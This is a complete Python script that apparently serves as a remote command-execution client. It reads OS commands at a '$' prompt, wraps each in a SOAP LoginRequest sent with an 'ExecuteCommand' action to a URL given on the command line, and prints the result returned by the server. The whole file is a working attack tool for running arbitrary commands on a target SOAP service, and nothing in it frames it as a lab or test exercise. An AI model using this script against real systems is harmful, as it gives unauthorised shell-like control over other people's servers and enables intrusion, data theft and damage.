import sys
import requests
import xml.etree.ElementTree as ET

def execute_command(url):
    while True:
        cmd = input("$ ")
        payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
        
        response = requests.post(url, data=payload, headers={"SOAPAction": '"ExecuteCommand"'})
        
        # Decode the response content
        response_content = response.content.decode('utf-8')
        
        try:
            # Parse the XML response
            root = ET.fromstring(response_content)
            
            # Define the namespaces
            namespaces = {
                'soap': 'http://schemas.xmlsoap.org/soap/envelope/',
                'tns': 'http://tempuri.org/'
            }
            
            # Find the <result> element
            result_element = root.find('.//{http://tempuri.org/}result')
            
            # Extract the text content of the <result> element if it exists
            if result_element is not None:
                result_text = result_element.text.strip()  # Strip surrounding whitespace and newline characters
                print(result_text)
            else:
                print("Please enter a valid OS command")
        except AttributeError:
            print("Please enter a valid OS command")
        except Exception as e:
            print("An error occurred:", e)

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <URL>")
        sys.exit(1)
    
    url = sys.argv[1]
    execute_command(url)
